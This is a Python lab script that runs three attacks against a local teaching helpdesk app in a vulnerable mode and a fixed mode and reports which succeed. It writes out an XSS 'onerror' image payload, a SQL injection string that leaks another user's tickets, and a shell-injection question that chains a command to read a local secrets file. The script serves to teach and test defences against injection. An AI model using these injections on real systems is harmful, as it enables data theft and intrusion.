"""
attack.py: send the three attack questions to the helpdesk app and report what happened.

    python3 attack.py --mode vulnerable     # watch model output change what the app does
    python3 attack.py --mode safe           # the same questions against the fixed app

It calls the app's code directly (no browser needed). To see the XSS pop up in a real browser, run
`python3 helpdesk_app.py` and ask "summarise my latest ticket" at http://127.0.0.1:8055.
"""

import argparse
import logging
import os

import helpdesk_app as app

SEP = "&" if os.name == "nt" else ";"                       # how a shell chains commands (Windows cmd vs sh)
READ = r"type data\fake_secrets.env" if os.name == "nt" else "cat data/fake_secrets.env"

ATTACKS = [
    ("HTML ", "summarise my latest ticket"),
    ("SQL  ", "search my tickets for: zzz' OR '1'='1' --"),
    ("SHELL", f"check the status of vpn{SEP} {READ}"),
]
PAYLOAD = "<img src=x onerror="
SECRET = "lab-only-not-a-real-password"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["vulnerable", "safe"], default="vulnerable")
    a = ap.parse_args()
    safe = a.mode == "safe"
    logging.basicConfig(level=logging.INFO, format="    log: %(levelname)s %(message)s")
    print(f"--- M5 lab · {a.mode.upper()} mode · stand-in model (stand_in_model.py, not AI) ---\n")
    hits = 0
    for kind, q in ATTACKS:
        print(f"[{kind}] you> {q}")
        r = app.answer_question(q, safe)
        if kind.strip() == "HTML":
            ran = PAYLOAD in r["answer_html"]
            print(f"    page HTML: {r['answer_html'][:110]}...")
            print("    RESULT: " + ("EXPLOITED - a browser would RUN the onerror code (XSS)" if ran
                                    else "safe - the payload is shown as text, not run"))
        elif kind.strip() == "SQL":
            owners = sorted({row[1] for row in r["rows"]})
            leaked = [row for row in r["rows"] if row[1] != app.CURRENT_USER]
            print(f"    rows returned: {len(r['rows'])}, owners: {', '.join(owners) or 'none'}")
            ran = bool(leaked)
            print("    RESULT: " + (f"EXPLOITED - {len(leaked)} of bob's tickets leaked to alice" if ran
                                    else "safe - the search term was treated as plain text"))
        else:
            ran = SECRET in (r["status"] or "")
            print("    helper output: " + (r["status"] or "").replace("\n", " | "))
            print("    RESULT: " + ("EXPLOITED - an extra command read data/fake_secrets.env" if ran
                                    else "safe - only allow-listed service names reach the helper"))
        hits += ran
        print()
    print(f"{hits} of {len(ATTACKS)} attacks changed what the app did.")


if __name__ == "__main__":
    main()
